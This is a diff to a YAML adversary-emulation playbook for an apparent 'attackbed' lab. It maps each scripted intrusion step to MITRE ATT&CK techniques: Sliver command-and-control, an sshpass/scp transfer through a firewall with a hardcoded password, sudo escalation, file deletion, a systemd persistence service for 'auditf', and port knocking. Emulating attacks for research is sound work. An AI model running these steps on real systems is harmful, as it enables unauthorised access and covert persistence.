@@ -4,11 +4,16 @@
 #
 ####################
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
-  $REPOSERVER_ADDRESS: 172.17.100.122
+
+#  $SERVER_ADDRESS: 192.42.0.254
+#  $REPOSERVER_ADDRESS: 172.17.100.122
+#  $LINUXSHARE_ADDRESS: 192.168.100.23
+
+  $SERVER_ADDRESS: fw.attackbed.com
+  $REPOSERVER_ADDRESS: puppet.attackbed.local
   $ATTACKER_ADDRESS: 192.42.1.174
-  $FIREWALL_ADDRESS: 172.17.100.254
-  $LINUXSHARE_ADDRESS: 192.168.100.23
+  $FIREWALL_ADDRESS: firewall.attackbed.local
+  $LINUXSHARE_ADDRESS: linuxshare.attackbed.local
 
 commands:
   - type: sliver
@@ -17,7 +22,7 @@ commands:
     name: "sliver1"
     metadata:
       techniques: "T1071.001"
-      tactic: "Command and Control"
+      tactics: "Command and Control"
       technique_name: "Application Layer Protocol: Web Protocols"
 
   - type: sliver
@@ -26,14 +31,14 @@ commands:
     port: 443
     metadata:
       techniques: "T1071.001"
-      tactic: "Command and Control"
+      tactics: "Command and Control"
       technique_name: "Application Layer Protocol: Web Protocols"
 
   - type: shell
     cmd: sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand="sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -p 10022 john@$SERVER_ADDRESS nc $FIREWALL_ADDRESS 22" /home/aecid/auditf.tar.gz john@$FIREWALL_ADDRESS:/tmp/auditf.tar.gz
     metadata:
       techniques: "T1078.003,T1105,T1205.001"
-      tactic: "Initial Access,Lateral Movement,Defense Evasion"
+      tactics: "Initial Access,Lateral Movement,Defense Evasion"
       technique_name: "Valid Accounts: Local Accounts,Ingress Tool Transfer,Traffic Signaling: Port Knocking"
 
   - type: ssh
@@ -45,7 +50,7 @@ commands:
     cmd: id
     metadata:
       techniques: "T1078.003"
-      tactic: "Initial Access"
+      tactics: "Initial Access"
       technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
@@ -54,7 +59,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1078.003"
-      tactic: "Lateral Movement"
+      tactics: "Lateral Movement"
       technique_name: "Valid Accounts: Local Accounts"
   
   - type: sleep
@@ -66,7 +71,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1078.003"
-      tactic: "Lateral Movement"
+      tactics: "Lateral Movement"
       technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
@@ -75,7 +80,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1548.003"
-      tactic: "Privilege Escalation"
+      tactics: "Privilege Escalation"
       technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
   
   - type: sleep
@@ -87,7 +92,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1548.003"
-      tactic: "Privilege Escalation"
+      tactics: "Privilege Escalation"
       technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
   
   - type: ssh
@@ -96,7 +101,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1036.005,T1205.001"
-      tactic: "Defense Evasion"
+      tactics: "Defense Evasion"
       technique_name: "Masquerading: Match Legitimate Name or Location,Traffic Signaling: Port Knocking"
 
   - type: ssh
@@ -105,7 +110,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1070.004"
-      tactic: "Defense Evasion"
+      tactics: "Defense Evasion"
       technique_name: "Indicator Removal: File Deletion"
 
   - type: ssh
@@ -134,28 +139,16 @@ commands:
     cmd: "vim /etc/systemd/system/auditf.service\n"
     interactive: True
     session: foothold
-    metadata:
-      techniques: "T1543.002"
-      tactic: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":inoremap jj <ESC>\n"
     interactive: True
     session: foothold
-    metadata:
-      techniques: "T1543.002"
-      tactic: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "o"
     interactive: True
     session: foothold
-    metadata:
-      techniques: "T1543.002"
-      tactic: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "[Unit]\nDescription=Run auditf on boot\n\n[Service]\nExecStart=/usr/bin/auditf\nWorkingDirectory=/usr/bin\nRestart=on-failure\nType=simple\n\n[Install]\nWantedBy=multi-user.target\n"
@@ -163,17 +156,13 @@ commands:
     session: foothold
     metadata:
       techniques: "T1543.002"
-      tactic: "Persistence"
+      tactics: "Persistence"
       technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "jj"
     interactive: True
     session: foothold
-    metadata:
-      techniques: "T1543.002"
-      tactic: "Persistence"
-      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":wq!\n"
@@ -181,7 +170,7 @@ commands:
     session: foothold
     metadata:
       techniques: "T1543.002"
-      tactic: "Persistence"
+      tactics: "Persistence"
       technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
@@ -193,7 +182,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1543.002"
-      tactic: "Persistence"
+      tactics: "Persistence"
       technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
@@ -205,7 +194,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1543.002"
-      tactic: "Persistence"
+      tactics: "Persistence"
       technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
@@ -217,7 +206,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1543.002"
-      tactic: "Persistence"
+      tactics: "Persistence"
       technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
@@ -242,7 +231,7 @@ commands:
     cmd: /home/aecid/knock-cli -c knock.yaml -r knock-firewall
     metadata:
       techniques: "T1205.001,T1071.001,T1036.005"
-      tactic: "Defense Evasion,Persistence,Command and Control"
+      tactics: "Defense Evasion,Persistence,Command and Control"
       technique_name: "Traffic Signaling: Port Knocking,Application Layer Protocol: Web Protocols,Masquerading: Match Legitimate Name or Location"
 
   - type: sleep
@@ -260,7 +249,7 @@ commands:
     session: sliver1
     metadata:
       techniques: "T1599"
-      tactic: "Defense Evasion"
+      tactics: "Defense Evasion"
       technique_name: "Network Boundary Bridging"
 
   - type: sliver-session
@@ -271,7 +260,7 @@ commands:
     session: sliver1
     metadata:
       techniques: "T1599"
-      tactic: "Defense Evasion"
+      tactics: "Defense Evasion"
       technique_name: "Network Boundary Bridging"
 
   - type: ssh
@@ -283,7 +272,7 @@ commands:
     cmd: id
     metadata:
       techniques: "T1078.003"
-      tactic: "Initial Access"
+      tactics: "Initial Access"
       technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
@@ -292,7 +281,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1078.003"
-      tactic: "Lateral Movement"
+      tactics: "Lateral Movement"
       technique_name: "Valid Accounts: Local Accounts"
 
   - type: sleep
@@ -304,7 +293,7 @@ commands:
     interactive: True
     metadata:
       techniques: "T1078.003"
-      tactic: "Lateral Movement"
+      tactics: "Lateral Movement"
       technique_name: "Valid Accounts: Local Accounts"
 
   - type: sleep
@@ -316,16 +305,8 @@ commands:
     interactive: True
     metadata:
       techniques: "T1082"
-      tactic: "Discovery"
+      tactics: "Discovery"
       technique_name: "System Information Discovery"
 
-
-
-
-
-
-
-
-
-
-  
+  - type: sleep
+    seconds: 30 
